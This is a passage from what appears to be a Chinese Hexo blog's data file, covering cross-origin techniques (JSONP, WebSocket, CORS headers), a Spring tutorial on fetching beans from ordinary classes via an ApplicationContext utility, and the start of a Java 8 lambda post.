class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function addScriptTag(src) &#123;  </span><br><span class=\"line\">  var script = document.createElement(&apos;script&apos;);  </span><br><span class=\"line\">  script.setAttribute(&quot;type&quot;,&quot;text/javascript&quot;);  </span><br><span class=\"line\">  script.src = src;  </span><br><span class=\"line\">  document.body.appendChild(script);  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">window.onload = function () &#123;  </span><br><span class=\"line\">  addScriptTag(&apos;http://example.com/ip?callback=foo&apos;);  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function foo(data) &#123;  </span><br><span class=\"line\">  console.log(&apos;Your public IP address is: &apos; + data.ip);  </span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-WebSocket\"><a href=\"#2-WebSocket\" class=\"headerlink\" title=\"2.WebSocket\"></a>2.WebSocket</h2><p>首先WebSocket是一个协议.WebSocket 可以由服务端主动向客户端推送消息，是双全工方式。<br><br>而http，只能由客户端发起，是单向请求。<br></p>\n<p>具体可看:<a href=\"https://www.ruanyifeng.com/blog/2017/05/websocket.html\">https://www.ruanyifeng.com/blog/2017/05/websocket.html</a></p>\n<h2 id=\"3-CORS\"><a href=\"#3-CORS\" class=\"headerlink\" title=\"3.CORS\"></a>3.CORS</h2><p>(原文) <a href=\"http://www.ruanyifeng.com/blog/2016/04/cors.html\">http://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>\n<p>Cross-origin resource sharing(跨域资源共享),是一个W3C标准，需要浏览器和服务器同时支持,目前浏览器都已支持，服务器端需进行配置.<br></p>\n<p>CORS请求分为简单请求和非简单请求。<br></p>\n<h3 id=\"3-1-简单请求\"><a href=\"#3-1-简单请求\" class=\"headerlink\" title=\"3.1 简单请求\"></a>3.1 简单请求</h3><h4 id=\"3-1-1-特征\"><a href=\"#3-1-1-特征\" class=\"headerlink\" title=\"3.1.1 特征\"></a>3.1.1 特征</h4><ul>\n<li><p>请求方式</p>\n<p>请求方式为 HEAD,GET,POST</p>\n</li>\n<li><p>header信息</p>\n<p>header信息不超出以下范围：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Accept</span><br><span class=\"line\">Accept-Language</span><br><span class=\"line\">Content-Language</span><br><span class=\"line\">Last-Event-ID</span><br><span class=\"line\">Content-Type：</span><br><span class=\"line\">        application/x-www-form-urlencoded、 multipart/form-data、text/plain</span><br></pre></td></tr></table></figure>\n<p>一般主要是看Content-Type, 比如Content-Type: application/json 为复杂请求</p>\n</li>\n</ul>\n<h4 id=\"3-1-2-请求流程\"><a href=\"#3-1-2-请求流程\" class=\"headerlink\" title=\"3.1.2 请求流程\"></a>3.1.2 请求流程</h4><p> 对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。<br> 如：<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /cors HTTP/1.1</span><br><span class=\"line\">Origin: http://api.bob.com</span><br><span class=\"line\">Host: api.alice.com</span><br><span class=\"line\">Accept-Language: en-US</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">User-Agent: Mozilla/5.0...</span><br></pre></td></tr></table></figure></p>\n<p> 如果 Origin 不在许可的范围内，浏览器会返回一个正常的HTTP响应，但是响应头中不包含Access-Control-Allow-Origin信息，此时浏览器就知道出错了。</p>\n<p> 如果 Origin 在许可的范围内，服务器返回会多出几个头信息。<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Access-Control-Allow-Origin: http://api.bob.com</span><br><span class=\"line\">Access-Control-Allow-Credentials: true</span><br><span class=\"line\">Access-Control-Expose-Headers: FooBar</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"3-2-非简单请求\"><a href=\"#3-2-非简单请求\" class=\"headerlink\" title=\"3.2 非简单请求\"></a>3.2 非简单请求</h3><p>超出简单请求范围的请求。<br></p>\n<p>如请求方式为PUT,DELETE, header包含Cookie， Content-Type为 application/json 等。</p>\n<p>非简单请求浏览器会先发送一个 OPTION 类型的预检请求，向服务器确认是否可以跨域。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">OPTIONS /cors HTTP/1.1</span><br><span class=\"line\">Origin: http://api.bob.com</span><br><span class=\"line\">Access-Control-Request-Method: PUT</span><br><span class=\"line\">Access-Control-Request-Headers: X-Custom-Header</span><br><span class=\"line\">Host: api.alice.com</span><br><span class=\"line\">Accept-Language: en-US</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">User-Agent: Mozilla/5.0...</span><br></pre></td></tr></table></figure>\n<p>服务器收到预检请求后，检查Cors的相关信息，如果确认允许，则返回允许的信息，浏览器再发送真正请求，带上Origin字段。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Mon, 01 Dec 2008 01:15:39 GMT</span><br><span class=\"line\">Server: Apache/2.0.61 (Unix)</span><br><span class=\"line\">Access-Control-Allow-Origin: http://api.bob.com</span><br><span class=\"line\">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class=\"line\">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class=\"line\">Content-Type: text/html; charset=utf-8</span><br><span class=\"line\">Content-Encoding: gzip</span><br><span class=\"line\">Content-Length: 0</span><br><span class=\"line\">Keep-Alive: timeout=2, max=100</span><br><span class=\"line\">Connection: Keep-Alive</span><br><span class=\"line\">Content-Type: text/plain</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PUT /cors HTTP/1.1</span><br><span class=\"line\">Origin: http://api.bob.com</span><br><span class=\"line\">Host: api.alice.com</span><br><span class=\"line\">X-Custom-Header: value</span><br><span class=\"line\">Accept-Language: en-US</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">User-Agent: Mozilla/5.0...</span><br></pre></td></tr></table></figure>\n<p>如果预检信息不通过，则服务器返回的不带Cors相关信息。<br>浏览器根据Cors相关信息来确定是否允许跨域。</p>\n</script></a></image></li></ul>"},{"title":"Spring上下文","date":"2018-08-30T20:34:21.000Z","_content":"\n非spring管理的类（普通类），获得一个Bean。\n在一个普通类中，@Autowired和new都不能导入一个Bean对象\n```\npublic class AcceptDeal extends Thread {\n  @Autowired\n  LogService logservice;//但此时mapper中信息又为null\n  //或者new 一个对象\n  //LogService logservice = new LogService();//此时mapper又不能导入\n}\n```\n解决方案：使用Spring上下文，获取Bean\n\n###### 1.新建一个工具类SpringUtil\n可以根据自己的需要添加上下文相关的管理方法\n```\npackage com.bonc.sms.util;\n\nimport org.springframework.beans.BeansException;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.ApplicationContextAware;\nimport org.springframework.stereotype.Component;\n\n/**\n * 普通类调用Spring bean对象：\n */\n@Component\npublic class SpringUtil implements ApplicationContextAware{\n\tprivate static ApplicationContext applicationContext = null;\n\n\t@Override\n\tpublic void setApplicationContext(ApplicationContext applicationContext) throws BeansException {\n\t   if(SpringUtil.applicationContext == null){\n\t\t   SpringUtil.applicationContext  = applicationContext;\n\t   }\n\t}\n\n\t//获取applicationContext\n\tpublic static ApplicationContext getApplicationContext() {\n\t   return applicationContext;\n\t}\n\n\t//通过name获取 Bean.\n\tpublic static Object getBean(String name){\n\t   return getApplicationContext().getBean(name);\n\t}\n\n\t//通过class获取Bean.\n\tpublic static <T> T getBean(Class<T> clazz){\n\t   return getApplicationContext().getBean(clazz);\n\t}\n\n\t//通过name,以及Clazz返回指定的Bean\n\tpublic static <T> T getBean(String name,Class<T> clazz){\n\t   return getApplicationContext().getBean(name, clazz);\n\t}\n}\n```\n\n###### 2.在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext\n1.因为SpringUtil.setApplicationContext(app)不是static方法，所以不这样用\n```\n@SpringBootApplication\npublic class App{\n\tpublic static void main( String[] args ){\n\t\tSystem.out.println( \"Hello World!\" );\n\t\tApplicationContext app = SpringApplication.run(App.class, args);\n\t\tSpringUtil.setApplicationContext(app);\n\t}\n}\n```\n2.解决办法\n```\n//在启动类上加@ComponentScan注解\n@SpringBootApplication\n@ComponentScan(basePackages = \"com.***\")\npublic class SmsUpstreamApplication extends SpringBootServletInitializer {\n\n    public static void main(String[] args) {\n        SpringApplication.run(SmsUpstreamApplication.class, args);\n    }\n\n    @Override\n    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {\n        return builder.sources(SmsUpstreamApplication.class);\n    }\n}\n```\n###### 3.在普通类中通过getBean()获取\n```\n//导入Logservice\nLogService logService = (LogService) SpringUtil.getBean(LogService.class);\n```\n\n#### 2019/5/29补充\n用@DependsOn来控制bean的初始化顺序\n```\n//控制bean的加载顺序  确保不为null\n@DependsOn({\"socketLogService\",\"springUtil\"})\n```\n","source":"_posts/java/Spring上下文.md","raw":"---\ntitle: Spring上下文\ndate: 2018-08-30 16:34:21\ntags: [springboot, java]\n---\n\n非spring管理的类（普通类），获得一个Bean。\n在一个普通类中，@Autowired和new都不能导入一个Bean对象\n```\npublic class AcceptDeal extends Thread {\n  @Autowired\n  LogService logservice;//但此时mapper中信息又为null\n  //或者new 一个对象\n  //LogService logservice = new LogService();//此时mapper又不能导入\n}\n```\n解决方案：使用Spring上下文，获取Bean\n\n###### 1.新建一个工具类SpringUtil\n可以根据自己的需要添加上下文相关的管理方法\n```\npackage com.bonc.sms.util;\n\nimport org.springframework.beans.BeansException;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.ApplicationContextAware;\nimport org.springframework.stereotype.Component;\n\n/**\n * 普通类调用Spring bean对象：\n */\n@Component\npublic class SpringUtil implements ApplicationContextAware{\n\tprivate static ApplicationContext applicationContext = null;\n\n\t@Override\n\tpublic void setApplicationContext(ApplicationContext applicationContext) throws BeansException {\n\t   if(SpringUtil.applicationContext == null){\n\t\t   SpringUtil.applicationContext  = applicationContext;\n\t   }\n\t}\n\n\t//获取applicationContext\n\tpublic static ApplicationContext getApplicationContext() {\n\t   return applicationContext;\n\t}\n\n\t//通过name获取 Bean.\n\tpublic static Object getBean(String name){\n\t   return getApplicationContext().getBean(name);\n\t}\n\n\t//通过class获取Bean.\n\tpublic static <T> T getBean(Class<T> clazz){\n\t   return getApplicationContext().getBean(clazz);\n\t}\n\n\t//通过name,以及Clazz返回指定的Bean\n\tpublic static <T> T getBean(String name,Class<T> clazz){\n\t   return getApplicationContext().getBean(name, clazz);\n\t}\n}\n```\n\n###### 2.在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext\n1.因为SpringUtil.setApplicationContext(app)不是static方法，所以不这样用\n```\n@SpringBootApplication\npublic class App{\n\tpublic static void main( String[] args ){\n\t\tSystem.out.println( \"Hello World!\" );\n\t\tApplicationContext app = SpringApplication.run(App.class, args);\n\t\tSpringUtil.setApplicationContext(app);\n\t}\n}\n```\n2.解决办法\n```\n//在启动类上加@ComponentScan注解\n@SpringBootApplication\n@ComponentScan(basePackages = \"com.***\")\npublic class SmsUpstreamApplication extends SpringBootServletInitializer {\n\n    public static void main(String[] args) {\n        SpringApplication.run(SmsUpstreamApplication.class, args);\n    }\n\n    @Override\n    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) {\n        return builder.sources(SmsUpstreamApplication.class);\n    }\n}\n```\n###### 3.在普通类中通过getBean()获取\n```\n//导入Logservice\nLogService logService = (LogService) SpringUtil.getBean(LogService.class);\n```\n\n#### 2019/5/29补充\n用@DependsOn来控制bean的初始化顺序\n```\n//控制bean的加载顺序  确保不为null\n@DependsOn({\"socketLogService\",\"springUtil\"})\n```\n","slug":"java/Spring上下文","published":1,"updated":"2019-10-13T12:15:12.168Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321hi000o6dcpy5axc6n6","content":"<p>非spring管理的类（普通类），获得一个Bean。<br>在一个普通类中，@Autowired和new都不能导入一个Bean对象<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class AcceptDeal extends Thread &#123;</span><br><span class=\"line\">  @Autowired</span><br><span class=\"line\">  LogService logservice;//但此时mapper中信息又为null</span><br><span class=\"line\">  //或者new 一个对象</span><br><span class=\"line\">  //LogService logservice = new LogService();//此时mapper又不能导入</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>解决方案：使用Spring上下文，获取Bean</p>\n<h6 id=\"1-新建一个工具类SpringUtil\"><a href=\"#1-新建一个工具类SpringUtil\" class=\"headerlink\" title=\"1.新建一个工具类SpringUtil\"></a>1.新建一个工具类SpringUtil</h6><p>可以根据自己的需要添加上下文相关的管理方法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.bonc.sms.util;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.beans.BeansException;</span><br><span class=\"line\">import org.springframework.context.ApplicationContext;</span><br><span class=\"line\">import org.springframework.context.ApplicationContextAware;</span><br><span class=\"line\">import org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * 普通类调用Spring bean对象：</span><br><span class=\"line\"> */</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class SpringUtil implements ApplicationContextAware&#123;</span><br><span class=\"line\">\tprivate static ApplicationContext applicationContext = null;</span><br><span class=\"line\"></span><br><span class=\"line\">\t@Override</span><br><span class=\"line\">\tpublic void setApplicationContext(ApplicationContext applicationContext) throws BeansException &#123;</span><br><span class=\"line\">\t   if(SpringUtil.applicationContext == null)&#123;</span><br><span class=\"line\">\t\t   SpringUtil.applicationContext  = applicationContext;</span><br><span class=\"line\">\t   &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//获取applicationContext</span><br><span class=\"line\">\tpublic static ApplicationContext getApplicationContext() &#123;</span><br><span class=\"line\">\t   return applicationContext;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//通过name获取 Bean.</span><br><span class=\"line\">\tpublic static Object getBean(String name)&#123;</span><br><span class=\"line\">\t   return getApplicationContext().getBean(name);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//通过class获取Bean.</span><br><span class=\"line\">\tpublic static &lt;T&gt; T getBean(Class&lt;T&gt; clazz)&#123;</span><br><span class=\"line\">\t   return getApplicationContext().getBean(clazz);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//通过name,以及Clazz返回指定的Bean</span><br><span class=\"line\">\tpublic static &lt;T&gt; T getBean(String name,Class&lt;T&gt; clazz)&#123;</span><br><span class=\"line\">\t   return getApplicationContext().getBean(name, clazz);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"2-在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext\"><a href=\"#2-在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext\" class=\"headerlink\" title=\"2.在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext\"></a>2.在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext</h6><p>1.因为SpringUtil.setApplicationContext(app)不是static方法，所以不这样用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@SpringBootApplication</span><br><span class=\"line\">public class App&#123;</span><br><span class=\"line\">\tpublic static void main( String[] args )&#123;</span><br><span class=\"line\">\t\tSystem.out.println( &quot;Hello World!&quot; );</span><br><span class=\"line\">\t\tApplicationContext app = SpringApplication.run(App.class, args);</span><br><span class=\"line\">\t\tSpringUtil.setApplicationContext(app);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>2.解决办法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//在启动类上加@ComponentScan注解</span><br><span class=\"line\">@SpringBootApplication</span><br><span class=\"line\">@ComponentScan(basePackages = &quot;com.***&quot;)</span><br><span class=\"line\">public class SmsUpstreamApplication extends SpringBootServletInitializer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        SpringApplication.run(SmsUpstreamApplication.class, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123;</span><br><span class=\"line\">        return builder.sources(SmsUpstreamApplication.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"3-在普通类中通过getBean-获取\"><a href=\"#3-在普通类中通过getBean-获取\" class=\"headerlink\" title=\"3.在普通类中通过getBean()获取\"></a>3.在普通类中通过getBean()获取</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//导入Logservice</span><br><span class=\"line\">LogService logService = (LogService) SpringUtil.getBean(LogService.class);</span><br></pre></td></tr></table></figure>\n<h4 id=\"2019-5-29补充\"><a href=\"#2019-5-29补充\" class=\"headerlink\" title=\"2019/5/29补充\"></a>2019/5/29补充</h4><p>用@DependsOn来控制bean的初始化顺序<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//控制bean的加载顺序  确保不为null</span><br><span class=\"line\">@DependsOn(&#123;&quot;socketLogService&quot;,&quot;springUtil&quot;&#125;)</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>非spring管理的类（普通类），获得一个Bean。<br>在一个普通类中，@Autowired和new都不能导入一个Bean对象<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class AcceptDeal extends Thread &#123;</span><br><span class=\"line\">  @Autowired</span><br><span class=\"line\">  LogService logservice;//但此时mapper中信息又为null</span><br><span class=\"line\">  //或者new 一个对象</span><br><span class=\"line\">  //LogService logservice = new LogService();//此时mapper又不能导入</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>解决方案：使用Spring上下文，获取Bean</p>\n<h6 id=\"1-新建一个工具类SpringUtil\"><a href=\"#1-新建一个工具类SpringUtil\" class=\"headerlink\" title=\"1.新建一个工具类SpringUtil\"></a>1.新建一个工具类SpringUtil</h6><p>可以根据自己的需要添加上下文相关的管理方法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.bonc.sms.util;</span><br><span class=\"line\"></span><br><span class=\"line\">import org.springframework.beans.BeansException;</span><br><span class=\"line\">import org.springframework.context.ApplicationContext;</span><br><span class=\"line\">import org.springframework.context.ApplicationContextAware;</span><br><span class=\"line\">import org.springframework.stereotype.Component;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * 普通类调用Spring bean对象：</span><br><span class=\"line\"> */</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class SpringUtil implements ApplicationContextAware&#123;</span><br><span class=\"line\">\tprivate static ApplicationContext applicationContext = null;</span><br><span class=\"line\"></span><br><span class=\"line\">\t@Override</span><br><span class=\"line\">\tpublic void setApplicationContext(ApplicationContext applicationContext) throws BeansException &#123;</span><br><span class=\"line\">\t   if(SpringUtil.applicationContext == null)&#123;</span><br><span class=\"line\">\t\t   SpringUtil.applicationContext  = applicationContext;</span><br><span class=\"line\">\t   &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//获取applicationContext</span><br><span class=\"line\">\tpublic static ApplicationContext getApplicationContext() &#123;</span><br><span class=\"line\">\t   return applicationContext;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//通过name获取 Bean.</span><br><span class=\"line\">\tpublic static Object getBean(String name)&#123;</span><br><span class=\"line\">\t   return getApplicationContext().getBean(name);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//通过class获取Bean.</span><br><span class=\"line\">\tpublic static &lt;T&gt; T getBean(Class&lt;T&gt; clazz)&#123;</span><br><span class=\"line\">\t   return getApplicationContext().getBean(clazz);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t//通过name,以及Clazz返回指定的Bean</span><br><span class=\"line\">\tpublic static &lt;T&gt; T getBean(String name,Class&lt;T&gt; clazz)&#123;</span><br><span class=\"line\">\t   return getApplicationContext().getBean(name, clazz);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"2-在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext\"><a href=\"#2-在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext\" class=\"headerlink\" title=\"2.在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext\"></a>2.在Springboot启动类中，向上下文工具类SpringContextUtil中注入applicationContext</h6><p>1.因为SpringUtil.setApplicationContext(app)不是static方法，所以不这样用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@SpringBootApplication</span><br><span class=\"line\">public class App&#123;</span><br><span class=\"line\">\tpublic static void main( String[] args )&#123;</span><br><span class=\"line\">\t\tSystem.out.println( &quot;Hello World!&quot; );</span><br><span class=\"line\">\t\tApplicationContext app = SpringApplication.run(App.class, args);</span><br><span class=\"line\">\t\tSpringUtil.setApplicationContext(app);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>2.解决办法<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//在启动类上加@ComponentScan注解</span><br><span class=\"line\">@SpringBootApplication</span><br><span class=\"line\">@ComponentScan(basePackages = &quot;com.***&quot;)</span><br><span class=\"line\">public class SmsUpstreamApplication extends SpringBootServletInitializer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        SpringApplication.run(SmsUpstreamApplication.class, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123;</span><br><span class=\"line\">        return builder.sources(SmsUpstreamApplication.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"3-在普通类中通过getBean-获取\"><a href=\"#3-在普通类中通过getBean-获取\" class=\"headerlink\" title=\"3.在普通类中通过getBean()获取\"></a>3.在普通类中通过getBean()获取</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//导入Logservice</span><br><span class=\"line\">LogService logService = (LogService) SpringUtil.getBean(LogService.class);</span><br></pre></td></tr></table></figure>\n<h4 id=\"2019-5-29补充\"><a href=\"#2019-5-29补充\" class=\"headerlink\" title=\"2019/5/29补充\"></a>2019/5/29补充</h4><p>用@DependsOn来控制bean的初始化顺序<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//控制bean的加载顺序  确保不为null</span><br><span class=\"line\">@DependsOn(&#123;&quot;socketLogService&quot;,&quot;springUtil&quot;&#125;)</span><br></pre></td></tr></table></figure></p>\n"},{"title":"java8新特性","date":"2019-08-12T23:07:33.000Z","_content":"\njava8 方便了函数式编程<br>\n\n# 一.lambda表达式\n\n## 1.意义\n\nlambda函数比较轻便，即用即仍，很适合需要完成一项功能，但是此功能只在此一处使用，连名字都很随意的情况下<br>\n\n<strong> 